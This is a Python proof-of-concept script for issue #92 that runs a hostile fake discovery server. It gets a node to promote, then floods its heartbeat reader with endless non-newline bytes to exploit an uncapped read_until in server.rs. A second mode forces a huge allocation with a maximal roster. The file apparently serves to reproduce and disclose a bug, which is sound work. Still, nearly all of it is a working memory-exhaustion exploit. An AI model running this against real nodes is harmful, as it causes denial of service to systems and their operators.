"""#92 probe: a hostile discovery server.

Speaks just enough of the protocol to get a real node to promote and start
heartbeating, then answers the heartbeat with `A ` followed by an endless
stream of non-newline bytes.  read_heartbeat_ack's `read_until(b'\n', ...)`
(server.rs:1746) has no size cap applied before the read, so the node's
heartbeat task buffers the flood without bound.

MODE=cap sends a well-formed but maximal in-bound roster instead, to show
the second (bounded-but-large) variant.
"""
import os, socket, threading, sys

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8357
MODE = os.environ.get("MODE", "flood")  # flood | cap | honest


def handle(conn, addr):
    conn.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    buf = b""
    # Read the J/P registration line + body; we don't parse it, just wait
    # until the node has sent its first newline-terminated header.
    while b"\n" not in buf:
        b = conn.recv(4096)
        if not b:
            conn.close(); return
        buf += b
    # Promote immediately.
    conn.sendall(b"R\n")
    # Now the node writes its first heartbeat (`H ...\n<name><token>`); wait
    # for it, then answer.
    buf = b""
    while b"\n" not in buf:
        b = conn.recv(4096)
        if not b:
            conn.close(); return
        buf += b
    if MODE == "honest":
        conn.sendall(b"A\n")  # "no update" — node keeps heartbeating happily
        while True:
            if not conn.recv(4096):
                break
        conn.close(); return
    if MODE == "cap":
        # A valid header claiming the maximum entry count; each entry is a
        # maximal name+addr. This is in-bound but forces a large allocation.
        count = 1 << 16
        conn.sendall(b"A %d 1\n" % count)
        entry = b"4096 4096\n" + b"n" * 4096 + b"a" * 4096 + b"\n"
        for _ in range(count):
            conn.sendall(entry)
        conn.close(); return
    # flood: valid header, then never a newline.
    conn.sendall(b"A 5 1\n")
    chunk = b"x" * (1 << 20)
    sent = 0
    try:
        while True:
            conn.sendall(chunk)
            sent += len(chunk)
    except OSError:
        pass
    print(f"flood to {addr} ended after {sent >> 20} MiB", flush=True)
    conn.close()


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0", PORT)); s.listen(64)
print(f"fake discovery ({MODE}) on :{PORT}", flush=True)
while True:
    conn, addr = s.accept()
    threading.Thread(target=handle, args=(conn, addr), daemon=True).start()
